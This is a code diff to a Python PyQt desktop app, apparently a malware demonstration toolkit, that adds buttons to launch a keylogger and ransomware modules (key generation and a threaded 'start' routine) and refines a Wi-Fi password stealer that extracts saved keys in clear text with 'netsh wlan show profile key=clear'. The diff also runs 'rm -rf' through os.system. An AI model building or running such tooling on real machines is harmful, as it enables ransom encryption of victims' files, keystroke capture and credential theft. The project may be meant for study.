@@ -9,10 +9,11 @@ import os
 from threading import Thread, Timer
 import subprocess
 import re
+from shutil import copytree
 
 from malwares.keylogger.keylogger import start_keylogger
-
-
+from malwares.ransomware.generate_public_private_keys import generate
+from malwares.ransomware.ransom import start
 # to open designer
 # qt5-tools designer
 
@@ -44,7 +45,7 @@ class App(QMainWindow):
         self.setWindowTitle("app")
 
         self.desktop = os.path.expanduser('~') + "\\Desktop"
-
+        self.hacker_dir = self.desktop+'\\hacker'
         # pages
         self.stack = self.findChild(QStackedWidget, "stackedWidget")
 
@@ -82,8 +83,10 @@ class App(QMainWindow):
         self.r_3 = self.findChild(QPushButton, "ransom_bt__3").clicked.connect(self.ransom_send)
         self.r_4 = self.findChild(QPushButton, "ransom_bt__4").clicked.connect(self.ransom_run)
         self.r_5 = self.findChild(QPushButton, "ransom_bt__5").clicked.connect(self.ransom_decrypt)
-        self.r_6 = self.findChild(QPushButton, "ransom_bt__6").clicked.connect(self.ransom_return)
+        self.r_6 = self.findChild(QPushButton, "ransom_bt__6").clicked.connect(self.ransom_send_dec)
+        self.r_7 = self.findChild(QPushButton, "ransom_bt__7").clicked.connect(self.ransom_return)
 
+        self.r_thread = Thread(target=start)
         # wifi
         self.wifi_button = self.findChild(QPushButton, "wifi_button_start")
         self.wifi_button.clicked.connect(self.wifi_password_start)
@@ -122,20 +125,32 @@ class App(QMainWindow):
         self.k_text += text
         self.keylogger_output.setText(f'{self.k_text}')
 
-    def ransom_start(self):
+    def ransom_start(self):  # create hacker and localRoot dir on desktop
+        copytree('malwares/ransomware/local', self.desktop, dirs_exist_ok=True)
+
+        if not os.path.exists(self.hacker_dir):
+            os.makedirs(self.hacker_dir)
+        else:
+            os.system('rm -rf {}'.format(self.hacker_dir))
+            os.makedirs(self.hacker_dir)
         self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_2"))
 
     def ransom_keys(self):
+        generate(self.hacker_dir)
         self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_3"))
 
     def ransom_send(self):
         self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_4"))
 
-    def ransom_run(self):
+    def ransom_run(self):  # start ransomware
+        self.r_thread.start()
         self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_5"))
 
     def ransom_decrypt(self):
         self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_6"))
+
+    # def ransom_send_dec(self):
+
 
     def ransom_return(self):
         self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_1"))
@@ -155,14 +170,14 @@ class App(QMainWindow):
 
                 profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
 
-                if re.search("Security key           : Absent", profile_info):
+                if re.search("Security key {11}: Absent", profile_info):
                     continue
                 else:
 
                     wifi_profile["ssid"] = name
                     profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                                        capture_output=True).stdout.decode()
-                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
+                    password = re.search("Key Content {12}: (.*)", profile_info_pass)
                     if password is None:
                         wifi_profile["password"] = None
                     else:
@@ -170,8 +185,7 @@ class App(QMainWindow):
                     wifi_list.append(wifi_profile)
 
         for x in range(len(wifi_list)):
-            self.wifi_text += str(wifi_list[x]) + '\n'
-            print("start")
+            self.wifi_text += f'ssid: {wifi_list[x]["ssid"]} || password: {wifi_list[x]["password"]}\n'
         self.wifi_output.setText(self.wifi_text)
 
 
